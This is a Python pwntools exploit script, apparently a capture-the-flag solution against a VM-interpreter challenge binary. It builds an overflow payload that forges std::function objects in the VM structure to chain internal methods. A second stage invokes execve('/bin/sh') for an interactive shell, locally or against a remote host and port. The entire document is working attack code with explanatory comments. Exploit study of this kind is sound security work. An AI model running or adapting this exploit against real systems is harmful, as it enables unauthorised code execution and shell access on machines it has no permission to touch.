#!/usr/bin/env python3
from pwn import *


elf = context.binary = ELF("./pwn", checksec=False)
context.log_level = "info"


VM_OPERATOR = elf.symbols["_ZN2VM11vm_operatorEv"]
INPUT_CODE = elf.symbols["_ZN2VM9inputCodeEv"]
VM_SYSCALL = elf.symbols["_ZN2VM10vm_syscallEv"]

log.info(hex(VM_SYSCALL))
pause()

# Fixed executable bytes in .text: 01 04 00 ...
# Interpreted by the fake vm_operator as:
#   1 -> fake stack_func()
#   4 -> fake syscall_func()
#   0 -> stop
OP_1_4_0 = 0x4033BC

# Writable, fixed because PIE is disabled. This lands inside the copied
# std::cout object; the chain does not use cout after the second-stage write.
# Avoid 0x4120xx because byte 0x20 is whitespace and would truncate vm_exit2's
# formatted char[] read.
WRITE_BASE = 0x412100

# vm_exit2's formatted read leaves the whitespace delimiter unread. We use one
# space as that delimiter, let inputCode write it at WRITE_BASE, and point the
# syscall register vector at the following byte.
REGS = WRITE_BASE + 1
BINSH = REGS + 0x20

# VM layout offsets, measured from the real VM base.
EXIT_CODE_BUFFER = 0xA4
REAL_EXIT_FUNC = 0x138

# Once real exit_func is called as a fake VM object, fake this == VM + 0x138.
FAKE_STACK_FUNC = REAL_EXIT_FUNC + 0xB8
FAKE_SYSCALL_FUNC = REAL_EXIT_FUNC + 0x118
FAKE_SYSCALL_REGS_VEC = FAKE_SYSCALL_FUNC + 0x20


def at(off):
    return off - EXIT_CODE_BUFFER


def put_qword(buf, off, val):
    rel = at(off)
    if rel < 0:
        raise ValueError("negative relative offset")
    if len(buf) < rel + 8:
        buf.extend(b"A" * (rel + 8 - len(buf)))
    buf[rel:rel + 8] = p64(val)


def make_direct_function(invoker, q0=0, q1=0, manager=1):
    return p64(q0) + p64(q1) + p64(manager) + p64(invoker)


def build_overflow():
    payload = bytearray(b"0")

    # Real exit_func becomes a direct call to VM::vm_operator.
    # For the fake VM, ip is the invoker qword itself. Set vector start so
    # start + ip == OP_1_4_0 without knowing the heap address.
    fake_ip = VM_OPERATOR
    fake_start = (OP_1_4_0 - fake_ip) & ((1 << 64) - 1)
    fake_end = (fake_start + fake_ip + 3) & ((1 << 64) - 1)
    put_qword(payload, REAL_EXIT_FUNC + 0x00, fake_start)
    put_qword(payload, REAL_EXIT_FUNC + 0x08, fake_end)
    put_qword(payload, REAL_EXIT_FUNC + 0x10, 1)
    put_qword(payload, REAL_EXIT_FUNC + 0x18, VM_OPERATOR)

    # fake stack_func: direct VM::inputCode, with its vm_code vector pointing to
    # fixed writable memory. This reads the second-stage register table.
    stack_func = make_direct_function(INPUT_CODE, WRITE_BASE, WRITE_BASE, WRITE_BASE + 0x100)
    rel = at(FAKE_STACK_FUNC)
    payload.extend(b"B" * max(0, rel + len(stack_func) - len(payload)))
    payload[rel:rel + len(stack_func)] = stack_func

    # fake syscall_func: direct VM::vm_syscall. Its vm_regs vector lives at
    # fake this + 0x20, so place a vector object there that points at REGS.
    syscall_func = make_direct_function(VM_SYSCALL)
    rel = at(FAKE_SYSCALL_FUNC)
    payload.extend(b"C" * max(0, rel + len(syscall_func) - len(payload)))
    payload[rel:rel + len(syscall_func)] = syscall_func

    put_qword(payload, FAKE_SYSCALL_REGS_VEC + 0x00, REGS)
    put_qword(payload, FAKE_SYSCALL_REGS_VEC + 0x08, REGS + 0x100)
    put_qword(payload, FAKE_SYSCALL_REGS_VEC + 0x10, REGS + 0x100)

    return bytes(payload)


def build_stage2():
    return flat(
        59,       # execve
        BINSH,    # filename
        0,        # argv
        0,        # envp
        b"/bin/sh\x00",
    )


def start():
    if args.REMOTE:
        if not args.HOST or not args.PORT:
            log.error("usage: REMOTE HOST=host PORT=port")
        return remote(args.HOST, int(args.PORT))
    return process("./pwn")


if __name__ == "__main__":
    io = start()
    io.sendlineafter(b"input your code:", b"\x05")
    io.sendafter(b"set your exit code", build_overflow() + b" ")
    io.sendline(build_stage2())
    io.interactive()
